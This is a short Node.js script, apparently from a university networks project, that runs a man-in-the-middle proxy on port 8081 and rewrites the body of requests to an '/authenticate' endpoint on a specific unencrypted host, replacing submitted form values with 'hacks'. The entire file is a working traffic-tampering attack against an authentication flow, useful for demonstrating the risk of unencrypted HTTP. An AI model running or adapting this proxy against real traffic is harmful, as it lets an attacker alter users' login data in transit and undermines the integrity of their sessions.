var Proxy = require('http-mitm-proxy');
var proxy = Proxy();

var port = 8081;

proxy.onError(function(ctx, err, errorKind) {
  var url = (ctx && ctx.clientToProxyRequest) ? ctx.clientToProxyRequest.url : '';
  //console.error(errorKind + ' on ' + url + ':', err);
});

proxy.onRequest(function(ctx, callback) {
  
  if (ctx.clientToProxyRequest.headers.host == 'notencrypted.proyectoredes.cloudns.cl') {
    
    if(ctx.clientToProxyRequest.url == '/authenticate'){
      ctx.use(Proxy.gunzip);

      ctx.onRequestData(function(ctx, chunk, callback){

        var data = chunk.toString('utf8');
        data = data.replace(/\=(\w+)\&/g,"=hacks&")
        var newChunk = Buffer.from(data,'utf-8');
        newChunk.copy(chunk);
 
        return callback(null,chunk);
      });

    }
  }
  return callback();
});

proxy.listen({ port: port });
console.log('listening on ' + port);